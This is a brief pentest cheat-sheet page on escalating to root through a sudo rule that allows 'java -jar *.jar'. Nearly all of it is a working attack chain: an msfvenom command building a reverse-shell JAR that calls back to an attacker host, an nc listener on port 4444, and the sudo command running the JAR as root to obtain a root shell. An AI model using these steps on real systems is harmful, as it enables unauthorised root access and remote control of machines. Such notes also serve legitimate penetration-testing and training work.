# Sudo Java Privilege Escalation

The `sudo java` command might be vulnerable to privilege escalation.

### Investigation <a href="#investigation" id="investigation"></a>

```
sudo -l

(root) /usr/bin/java -jar *.jar
```

If we can execute java command with arbitrary **`.jar`** file as root, we can escalate to privileges.

### Exploitation <a href="#exploitation" id="exploitation"></a>

#### 1. Create a JAR File <a href="#id-1-create-a-jar-file" id="id-1-create-a-jar-file"></a>

First, create a custom jar file in local machine.\
Replace **`<local-ip>`** with your local ip address.

```
msfvenom -p java/shell_reverse_tcp LHOST=<local-ip> LPORT=4444 -f jar -o shell.jar
```

Then transfer the file to remote machine.

#### 2. Reverse Shell <a href="#id-2-reverse-shell" id="id-2-reverse-shell"></a>

In local machine, start a listener.

```
nc -lvnp 4444
```

Now execute the java command as root in target machine.

```
sudo /usr/bin/java -jar /tmp/shell.jar
```

We should get a root shell.
